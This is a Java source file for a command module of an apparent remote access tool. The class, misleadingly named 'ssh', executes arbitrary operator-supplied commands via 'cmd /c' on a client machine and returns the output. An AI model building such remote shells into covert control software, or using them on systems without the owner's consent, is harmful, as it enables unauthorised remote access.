package main.java.rat.command.clientCommands;

import main.java.rat.command.ClientCommand;
import main.java.rat.command.InteractableCommand;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ClientSSHCommand extends ClientCommand implements InteractableCommand {

    boolean isInSession = false;
    private Runtime terminalProcess;

    @Override
    public String getMainCommandName() {
        return "ssh";
    }

    @Override
    public String getHelpText() {
        return "Start SSH session with the client, use 'exit' to exit";
    }

    @Override
    public String getExtendedHelpText() {
        return getHelpText();
    }

    @Override
    public boolean executeCommand() {
        isInSession = true;
        logger.log("Entered SSH session. Use 'exit' to exit the session");
        terminalProcess = Runtime.getRuntime();
        return true;
    }

    @Override
    public String getExitString() {
        return "exit";
    }

    @Override
    public void execute(String command) {
        try {
            Process process = terminalProcess.exec("cmd /c "+command);
            StringBuilder output = new StringBuilder();

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            int exitVal = process.waitFor();
            if (exitVal == 0) {
                logger.log(output.toString());
            } else {
                logger.log(output.toString());
            }
        } catch (IOException | InterruptedException e) {
            logger.log(e.getMessage());
        }
    }

    @Override
    public boolean isInSession() {
        return isInSession;
    }

    @Override
    public void exit() {
        this.isInSession = false;
        logger.log("Exiting ssh...");
    }
}
